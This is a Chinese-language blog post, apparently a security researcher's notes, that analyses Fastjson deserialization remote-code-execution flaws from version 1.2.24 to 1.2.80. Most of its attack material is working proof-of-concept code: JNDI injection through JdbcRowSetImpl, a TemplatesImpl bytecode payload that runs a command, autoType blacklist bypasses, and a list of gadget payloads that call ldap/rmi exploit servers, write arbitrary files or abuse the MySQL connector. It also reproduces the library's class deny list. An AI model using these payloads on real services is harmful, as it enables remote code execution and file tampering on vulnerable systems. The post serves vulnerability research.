@@ -1,0 +1,660 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>Fastjson | Hurn's Blog</title><meta name="description" content="Fastjson - Hurn"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="Hurn's Blog"><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div class="wrap"><header><h1 class="branding"><a href="/" title="Hurn's Blog"><img class="logo-image" src="/logo.png" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives" target="_self">ARCHIVES</a></li><li class="nav-list-item"><a class="nav-list-link" href="https://github.com/Dreyer" target="_blank">GITHUB</a></li><li class="nav-list-item"><a class="nav-list-link" href="/atom.xml" target="_self">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">Fastjson</h1><div class="post-info"><a></a>2022-06-08</div><div class="post-content"><h1 id="0x0-Fastjson"><a href="#0x0-Fastjson" class="headerlink" title="0x0 Fastjson"></a>0x0 Fastjson</h1><p>Java中有将json数据与java bean序列化、反序列化绑定的需求，在Fastjson中提供两个主要接口toJsonString和parseObject来分别实现序列化和反序列化，使用Fastjson可以很方便的将json字符串反序列化成对象，并且基于@type的特性，能够实例化指定类。</p>
+<pre><code class="java">// 序列化
+String jsonString = JSON.toJSONString(user);
+// 反序列化
+User user = JSON.parseObject(jsonString, User.class);
+</code></pre>
+<p><strong>Fastjson架构图：</strong></p>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/JdbcRowSetImpl_1.png" alt="JdbcRowSetImpl_1"></p>
+<p>（图来自：<a target="_blank" rel="noopener" href="http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/</a>)</p>
+<blockquote>
+<p>主要的功能都是在<code>DefaultJSONParser</code>类中实现的，在这个类中会应用其他的一些外部类来完成后续操作。<code>ParserConfig</code>主要是进行配置信息的初始化，<code>JSONLexer</code>主要是对json字符串进行处理并分析，反序列化在<code>JavaBeanDeserializer</code>中处理。</p>
+</blockquote>
+<p><strong>Json字符串的解析流程：</strong></p>
+<ol>
+<li><p>DefaultJSONParser初始化，相关配置初始化</p>
+</li>
+<li><p>通过deserializer序列化对象，在parseObject中，如果指定了解析<code>class</code>则根据相应class获取<code>deserializer</code>，如果说不是<code>initDeserializer</code>中的类，则会调用<code>JavaBeanDeserializer#deserialze</code>转交<code>FastjsonASMDeserializer</code>利用Fastjson自己实现的ASM流程生成处理类.</p>
+</li>
+<li><p>解析json字符串的字段与值，通过标识位<code>lexer.token</code>的值，比如LBRACE（左括号）、LBRACKET （圆括号）等，进入4、5，并且设置下一个标识 <code>lexer.nextToken</code></p>
+<blockquote>
+<pre><code>  # 正常的kv结构
+  &#123;&quot;k&quot;:&quot;v&quot;&#125;
+
+  # 嵌套结构
+  &#123;&quot;k&quot;:&#123;&quot;kk&quot;:&quot;vv&quot;,&quot;kk&quot;:&quot;vv&quot;&#125;,&quot;k&quot;:&#123;&quot;k&quot;:&quot;kk&quot;,&quot;kk&quot;:&quot;vv&quot;,&quot;kk&quot;:&quot;vv&quot;&#125;&#125;,k:v&#125;
+</code></pre>
+<p>最开始解析的标志位为<code>&#123;</code></p>
+<ol>
+<li>判断下一个标志位是否为<code>&quot;</code>，如果是<code>&quot;</code>则提取key值，这时的标志位为<code>&quot;</code>。</li>
+<li>判断下一个标志位是否为<code>:</code>：<ul>
+<li>如果为<code>:</code>则判断下一个标志位是否为<code>&quot;</code>，如果是，则获取value值，这时的标志位为<code>&quot;</code>。</li>
+<li>如果为<code>&#123;</code>则重复1、2的过程。</li>
+</ul>
+</li>
+<li>判断下一个标志位是否为<code>&#125;</code>：<ul>
+<li>如果为<code>&#125;</code>则表示这一个单元的解析结束</li>
+<li>如果为<code>,</code>则表示要解析下一个kv的数据，重复1、2、3</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+</li>
+<li><p>判断解析的字符串中是否存在symbolTable中的字段，例如<code>@type</code>、<code>$ref</code> ，如果出现了<code>@type</code>则交由<code>public final Object parseObject(final Map object, Object fieldName)</code>来处理</p>
+</li>
+<li><p>如果解析出来的字符串为键、值则追加到map中，如果为双引号、括号等，重复3、4</p>
+</li>
+</ol>
+<h1 id="0x1-Version-1-2-24"><a href="#0x1-Version-1-2-24" class="headerlink" title="0x1 Version 1.2.24"></a>0x1 Version 1.2.24</h1><p>环境：</p>
+<ul>
+<li>Fastjson版本 1.2.24</li>
+<li>jdk参考JNDI，如果是RMI 需要低版本的JDK，这里用1.8.102</li>
+</ul>
+<p>poc1:</p>
+<pre><code class="java">String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ExecTest\&quot;,&quot; +
+&quot; \&quot;autoCommit\&quot;:true&#125;&quot;;
+</code></pre>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608103153064.png" alt="image-20220608103153064"></p>
+<p>如果是@type 会特殊处理，实例化该类</p>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608154409186.png" alt="image-20220608154409186"></p>
+<p>config.getDeserilizer创建Deserilizer</p>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608154220293.png" alt="image-20220608154220293"></p>
+<p>如果要反序列化的类不是内置的，则会创建JavaBeanDeserializer</p>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608154834849.png" alt="image-20220608154834849"></p>
+<p>通过ASMFactory工厂创建JavaBeanDeserializer</p>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608155009897.png" alt="image-20220608155009897"></p>
+<p>asmFactory.createJavaBeanDeserializer</p>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608155138953.png" alt="image-20220608155138953"></p>
+<p><code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze(com.alibaba.fastjson.parser.DefaultJSONParser, java.lang.reflect.Type, java.lang.Object)</code></p>
+<p>使用ASM工厂构建出来的JavaBeanDeserializer.Deserializer进行反序列化</p>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608155451795.png" alt="image-20220608155451795"></p>
+<p>类实例化完之后会继续解析字段，并为这些字段赋值</p>
+<p><code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseRest</code></p>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608155910782.png" alt="image-20220608155910782"></p>
+<p>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</p>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608160151099.png" alt="image-20220608160151099"></p>
+<p>com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer#parseField</p>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608160234068.png" alt="image-20220608160234068"></p>
+<p>com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue(java.lang.Object, java.lang.Object)</p>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608160303364.png" alt="image-20220608160303364"></p>
+<p>通过反射执行JdbcRowSetImpl.setAutoCommit，方法</p>
+<pre><code class="java">public void setAutoCommit(boolean var1) throws SQLException &#123;
+    if(this.conn != null) &#123;
+        this.conn.setAutoCommit(var1);
+    &#125; else &#123;
+        this.conn = this.connect();
+        this.conn.setAutoCommit(var1);
+    &#125;
+&#125;
+</code></pre>
+<p><code>this.connect</code>  调用<code>this.getDataSourceName()</code>，进行JNDI注入</p>
+<pre><code class="java">private Connection connect() throws SQLException &#123;
+    if(this.conn != null) &#123;
+        return this.conn;
+    &#125; else if(this.getDataSourceName() != null) &#123;
+        try &#123;
+            InitialContext var1 = new InitialContext();
+            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
+            return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;)?var2.getConnection(this.getUsername(), this.getPassword()):var2.getConnection();
+        &#125; catch (NamingException var3) &#123;
+            throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());
+        &#125;
+    &#125; else &#123;
+        return this.getUrl() != null?DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()):null;
+    &#125;
+&#125;
+</code></pre>
+<p>这里RCE的有两个关键点：</p>
+<ol>
+<li><p>实例化类</p>
+</li>
+<li><p>反射执行方法</p>
+</li>
+</ol>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608151545049.png" alt="image-20220608151545049"></p>
+<p>Version 1.2.24 及之前还有一个POC</p>
+<p>POC2:</p>
+<pre><code class="java">package fastjson;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.tomcat.util.codec.binary.Base64;
+
+public class V124_POC2 &#123;
+    public static void main(String[] args) throws Exception &#123;
+        String evilCode_base64 = readClass();
+        final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;
+        String payload = &quot;&#123;&#39;rand1&#39;:&#123;&quot; +
+                &quot;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS + &quot;\&quot;,&quot; +
+                &quot;\&quot;_bytecodes\&quot;:[\&quot;&quot; + evilCode_base64 + &quot;\&quot;],&quot; +
+                &quot;&#39;_name&#39;:&#39;aaa&#39;,&quot; +
+                &quot;&#39;_tfactory&#39;:&#123;&#125;,&quot; +
+                &quot;&#39;_outputProperties&#39;:&#123;&#125;&quot; +
+                &quot;&#125;&#125;\n&quot;;
+        JSON.parseObject(payload,User.class , Feature.SupportNonPublicField);
+        System.out.println(payload);
+    &#125;
+    public static class AaAa &#123;
+
+    &#125;
+
+    public static String readClass() throws Exception &#123;
+        ClassPool pool = ClassPool.getDefault();
+        CtClass cc = pool.get(AaAa.class.getName());
+        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;
+        cc.makeClassInitializer().insertBefore(cmd);
+        String randomClassName = &quot;AaAa&quot; + System.nanoTime();
+        cc.setName(randomClassName);
+        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
+        byte[] evilCode = cc.toBytecode();
+
+        return Base64.encodeBase64String(evilCode);
+
+    &#125;
+&#125;
+</code></pre>
+<blockquote>
+<p>TemplatesImpl类中<code>_bytecodes</code>、<code>_tfactory</code>、<code>_name</code>、<code>_outputProperties</code>、<code>_class</code>并没有对应的setter，所以要为这些private属性赋值，就需要开启SupportNonPublicField特性</p>
+</blockquote>
+<h1 id="0x2-Version-1-2-25-1-2-41"><a href="#0x2-Version-1-2-25-1-2-41" class="headerlink" title="0x2 Version 1.2.25 - 1.2.41"></a>0x2 Version 1.2.25 - 1.2.41</h1><p>1.2.25的修补方案是在创建@type指定的类之前，使用checkAutoType检查@type的类</p>
+<pre><code class="java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;
+        if (typeName == null) &#123;
+            return null;
+        &#125;
+
+        final String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);
+
+        // 位置1，开启了autoTypeSupport，先白名单，如果在这个白名单里面的类直接加载返回
+        if (autoTypeSupport || expectClass != null) &#123;
+            for (int i = 0; i &lt; acceptList.length; ++i) &#123;
+                String accept = acceptList[i];
+                if (className.startsWith(accept)) &#123;
+                    return TypeUtils.loadClass(typeName, defaultClassLoader);
+                &#125;
+            &#125;
+
+            for (int i = 0; i &lt; denyList.length; ++i) &#123;
+                String deny = denyList[i];
+                if (className.startsWith(deny)) &#123;
+                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                &#125;
+            &#125;
+        &#125;
+
+        // 位置2，从已存在的map中获取clazz，也就是缓存
+        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);
+        if (clazz == null) &#123;
+            clazz = deserializers.findClass(typeName);
+        &#125;
+
+        if (clazz != null) &#123;
+            if (expectClass != null &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;
+                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+            &#125;
+
+            return clazz;
+        &#125;
+
+        // 位置3，没开启autoTypeSupport，依然会进行黑白名单检测，先黑名单，再白名单
+        if (!autoTypeSupport) &#123;
+            for (int i = 0; i &lt; denyList.length; ++i) &#123;
+                String deny = denyList[i];
+                if (className.startsWith(deny)) &#123;
+                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                &#125;
+            &#125;
+            for (int i = 0; i &lt; acceptList.length; ++i) &#123;
+                String accept = acceptList[i];
+                if (className.startsWith(accept)) &#123;
+                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
+
+                    if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;
+                        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+                    &#125;
+                    return clazz;
+                &#125;
+            &#125;
+        &#125;
+
+        // 位置4，过了黑白名单，autoTypeSupport开启，就加载目标类
+        if (autoTypeSupport || expectClass != null) &#123;
+            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
+        &#125;
+
+        if (clazz != null) &#123;
+            // ClassLoader、DataSource子类/子接口检测
+            if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
+                    || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
+                    ) &#123;
+                throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+            &#125;
+
+            if (expectClass != null) &#123;
+                if (expectClass.isAssignableFrom(clazz)) &#123;
+                    return clazz;
+                &#125; else &#123;
+                    throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+                &#125;
+            &#125;
+        &#125;
+
+        if (!autoTypeSupport) &#123;
+            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+        &#125;
+
+        return clazz;
+    &#125;
+</code></pre>
+<p>黑名单：</p>
+<pre><code class="txt">bsh
+com.mchange
+com.sun.
+java.lang.Thread
+java.net.Socket
+java.rmi
+javax.xml
+org.apache.bcel
+org.apache.commons.beanutils
+org.apache.commons.collections.Transformer
+org.apache.commons.collections.functors
+org.apache.commons.collections4.comparators
+org.apache.commons.fileupload
+org.apache.myfaces.context.servlet
+org.apache.tomcat
+org.apache.wicket.util
+org.codehaus.groovy.runtime
+org.hibernate
+org.jboss
+org.mozilla.javascript
+org.python.core
+org.springframework
+</code></pre>
+<p>绕过:</p>
+<p>在<code>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)</code>中实例化类，如果类名中以”L”并且以”;”结尾，则会去除头和尾的特殊字符，所以可以通过在前后加”L;”绕过</p>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608182349288.png" alt="image-20220608182349288"></p>
+<p>POC:</p>
+<pre><code class="java">import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+
+public class V125 &#123;
+    public static void main(String[] args) &#123;
+        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ExecTest\&quot;,&quot; +
+                &quot; \&quot;autoCommit\&quot;:true&#125;&quot;;
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        JSON.parseObject(payload);
+    &#125;
+&#125;
+</code></pre>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608183925157.png" alt="image-20220608183925157"></p>
+<h1 id="0x3-Version-1-2-42"><a href="#0x3-Version-1-2-42" class="headerlink" title="0x3 Version 1.2.42"></a>0x3 Version 1.2.42</h1><p>在<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code>判断className前后是否为 L、; ，如果是则截取第二个字符和到倒数第二个字符</p>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608204855159.png" alt="image-20220608204855159"></p>
+<p>双写 “LL”、”;;” 即可绕过</p>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608185502330.png" alt="image-20220608185502330"></p>
+<h1 id="0x4-Version-1-2-43"><a href="#0x4-Version-1-2-43" class="headerlink" title="0x4 Version 1.2.43"></a>0x4 Version 1.2.43</h1><p>在<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code>中修复，如果前后有”L”、”;”就抛出异常：</p>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608205304105.png" alt="image-20220608205304105"></p>
+<p>在<code>com.alibaba.fastjson.util.TypeUtils#loadClass</code>中可以看到如果以 “[“开头也会被特殊处理，即可绕过黑名单</p>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608185727632.png" alt="image-20220608185727632"></p>
+<pre><code class="java">package fastjson;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+
+public class V143 &#123;
+    public static void main(String[] args) &#123;
+        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ExecTest\&quot;,&quot; +
+                &quot; \&quot;autoCommit\&quot;:true&#125;&quot;;
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        JSON.parseObject(payload);
+    &#125;
+&#125;
+</code></pre>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608210021446.png" alt="image-20220608210021446"></p>
+<h1 id="0x5-Version-1-2-45"><a href="#0x5-Version-1-2-45" class="headerlink" title="0x5 Version 1.2.45"></a>0x5 Version 1.2.45</h1><p>黑名单绕过</p>
+<pre><code class="java">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;rmi://localhost:1099/Exploit&quot;&#125;&#125;
+</code></pre>
+<h1 id="0x6-Version-1-2-47"><a href="#0x6-Version-1-2-47" class="headerlink" title="0x6 Version 1.2.47"></a>0x6 Version 1.2.47</h1><p>这个版本可以在不开启autotype情况下能利用成功的绕过。</p>
+<p>POC:</p>
+<pre><code class="java">package fastjson;
+
+import com.alibaba.fastjson.JSON;
+
+public class V147 &#123;
+    public static void main(String[] args) &#123;
+        String payload = &quot;&#123;\n&quot; +
+                &quot;    \&quot;rand1\&quot;: &#123;\n&quot; +
+                &quot;        \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;, \n&quot; +
+                &quot;        \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot; +
+                &quot;    &#125;, \n&quot; +
+                &quot;    \&quot;rand2\&quot;: &#123;\n&quot; +
+                &quot;        \&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \n&quot; +
+                &quot;        \&quot;dataSourceName\&quot;: \&quot;rmi://127.0.0.1:1099/ExecTest\&quot;, \n&quot; +
+                &quot;        \&quot;autoCommit\&quot;: true\n&quot; +
+                &quot;    &#125;\n&quot; +
+                &quot;&#125;&quot;;
+        JSON.parseObject(payload);
+    &#125;
+&#125;
+</code></pre>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608212509587.png" alt="image-20220608212509587"></p>
+<p>绕过分析：</p>
+<ol>
+<li>利用到了<code>java.lang.class</code>，这个类不在黑名单，所以checkAutotype可以过</li>
+</ol>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608221450948.png" alt="image-20220608221450948"></p>
+<ol start="2">
+<li>这个<code>java.lang.class</code>类对应的deserializer为MiscCodec，deserialize时会取json串中的val值并load这个val对应的class，如果fastjson cache为true，就会缓存这个val对应的class到全局map中</li>
+</ol>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220608221744667.png" alt="image-20220608221744667"></p>
+<p>这里将JdbcRowSetImpl实例化并且添加到mapping中</p>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220613003029372.png" alt="image-20220613003029372"></p>
+<ol start="3">
+<li>再次循环上述步骤，加载@type类，此时的checkAutoType 可以通过TypeUtils.getClassFromMapping获得这个类</li>
+</ol>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220613003250245.png" alt="image-20220613003250245"></p>
+<h1 id="0x7-Version-1-2-62"><a href="#0x7-Version-1-2-62" class="headerlink" title="0x7 Version 1.2.62"></a>0x7 Version 1.2.62</h1><p>黑名单绕过</p>
+<pre><code class="java">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;
+</code></pre>
+<h1 id="0x8-Version-1-2-66"><a href="#0x8-Version-1-2-66" class="headerlink" title="0x8 Version 1.2.66"></a>0x8 Version 1.2.66</h1><pre><code class="java">&#123;&quot;@type&quot;:&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;, &quot;jndiNames&quot;:[&quot;ldap://localhost:1389/Exploit&quot;], &quot;Realms&quot;:[&quot;&quot;]&#125;
+</code></pre>
+<pre><code class="java">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;
+或
+&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;
+</code></pre>
+<pre><code class="java">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;&#125;
+</code></pre>
+<h1 id="0x9-Version-1-2-67"><a href="#0x9-Version-1-2-67" class="headerlink" title="0x9 Version 1.2.67"></a>0x9 Version 1.2.67</h1><pre><code class="java">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;:[&quot;ldap://localhost:1389/Exploit&quot;], &quot;tm&quot;: &#123;&quot;$ref&quot;:&quot;$.tm&quot;&#125;&#125;
+</code></pre>
+<pre><code class="java">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,&quot;instance&quot;:&#123;&quot;$ref&quot;:&quot;$.instance&quot;&#125;&#125;
+</code></pre>
+<h1 id="0x10-Version-1-2-68"><a href="#0x10-Version-1-2-68" class="headerlink" title="0x10 Version 1.2.68"></a>0x10 Version 1.2.68</h1><p>这里与1.2.47类似，第一个@type都是使用了内置的类，在第二个@type创建时因为expectClass不为空所以能被创建出来</p>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220613005956922.png" alt="image-20220613005956922"></p>
+<p>expectClass不为空</p>
+<p><img src="/2022/06/08/Java/Fastjson%E5%88%86%E6%9E%90/image-20220613010314669.png" alt="image-20220613010314669"></p>
+<p>这个的限制是必须要继承<code>java.lang.AutoCloseable</code> ，一些poc:</p>
+<pre><code class="java">&#123;
+    &quot;stream&quot;: &#123;
+        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,
+        &quot;targetPath&quot;: &quot;f:/test/pwn.txt&quot;,
+        &quot;tempPath&quot;: &quot;f:/test/test.txt&quot;
+    &#125;,
+    &quot;writer&quot;: &#123;
+        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;,
+        &quot;buffer&quot;: &quot;文件内容 base64 编码&quot;,
+        &quot;outputStream&quot;: &#123;
+            &quot;$ref&quot;: &quot;$.stream&quot;
+        &#125;,
+        &quot;position&quot;: 5
+    &#125;,
+    &quot;close&quot;: &#123;
+        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;,
+        &quot;out&quot;: &#123;
+            &quot;$ref&quot;: &quot;$.writer&quot;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="json">Mysqlconnector 5.1.x
+&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;com.mysql.jdbc.JDBC4Connection&quot;,&quot;hostToConnectTo&quot;:&quot;mysql.host&quot;,&quot;portToConnectTo&quot;:3306,&quot;info&quot;:&#123;&quot;user&quot;:”user&quot;,&quot;password&quot;:”pass&quot;,&quot;statementInterceptors&quot;:&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,&quot;autoDeserialize&quot;:&quot;true&quot;,&quot;NUM_HOSTS&quot;: &quot;1&quot;&#125;,&quot;databaseToConnectTo&quot;:”dbname&quot;,&quot;url&quot;:&quot;&quot;&#125;
+
+Mysqlconnector 6.0.2 or 6.0.3
+&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;: &quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;,&quot;proxy&quot;:&#123;&quot;connectionString&quot;:&#123;&quot;url&quot;: &quot;jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true&quot;&#125;&#125;&#125;
+
+Mysqlconnector 6.x or &lt; 8.0.20
+&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;,&quot;proxy&quot;:&#123;&quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;,&quot;connectionUrl&quot;:&#123;&quot;@type&quot;:&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;, &quot;masters&quot;: [&#123;&quot;host&quot;:&quot;mysql.host&quot;&#125;], &quot;slaves&quot;:[], &quot;properties&quot;:&#123;&quot;host&quot;:&quot;mysql.host&quot;,&quot;user&quot;:&quot;user&quot;,&quot;dbname&quot;:&quot;dbname&quot;,&quot;password&quot;:&quot;pass&quot;,&quot;queryInterceptors&quot;:&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,&quot;autoDeserialize&quot;:&quot;true&quot;&#125;&#125;&#125;&#125;
+</code></pre>
+<pre><code class="json">&#123;
+    &#39;@type&#39;:&quot;java.lang.AutoCloseable&quot;,
+    &#39;@type&#39;:&#39;sun.rmi.server.MarshalOutputStream&#39;,
+    &#39;out&#39;:
+    &#123;
+        &#39;@type&#39;:&#39;java.util.zip.InflaterOutputStream&#39;,
+        &#39;out&#39;:
+        &#123;
+           &#39;@type&#39;:&#39;java.io.FileOutputStream&#39;,
+           &#39;file&#39;:&#39;dst&#39;,
+           &#39;append&#39;:false
+        &#125;,
+        &#39;infl&#39;:
+        &#123;
+            &#39;input&#39;:&#39;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&#39;
+        &#125;,
+        &#39;bufLen&#39;:1048576
+    &#125;,
+    &#39;protocolVersion&#39;:1
+&#125;
+</code></pre>
+<pre><code class="txt">&#123;
+    &#39;@type&#39;:&quot;java.lang.AutoCloseable&quot;,
+    &#39;@type&#39;:&#39;sun.rmi.server.MarshalOutputStream&#39;,
+    &#39;out&#39;:
+    &#123;
+        &#39;@type&#39;:&#39;java.util.zip.InflaterOutputStream&#39;,
+        &#39;out&#39;:
+        &#123;
+           &#39;@type&#39;:&#39;java.io.FileOutputStream&#39;,
+           &#39;file&#39;:&#39;dst&#39;,
+           &#39;append&#39;:false
+        &#125;,
+        &#39;infl&#39;:
+        &#123;
+            &#39;input&#39;:&#39;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&#39;
+        &#125;,
+        &#39;bufLen&#39;:1048576
+    &#125;,
+    &#39;protocolVersion&#39;:1
+&#125;
+</code></pre>
+<h1 id="0x11-Version-1-2-75-1-2-80"><a href="#0x11-Version-1-2-75-1-2-80" class="headerlink" title="0x11 Version 1.2.75/1.2.80"></a>0x11 Version 1.2.75/1.2.80</h1><p>类似1.2.68</p>
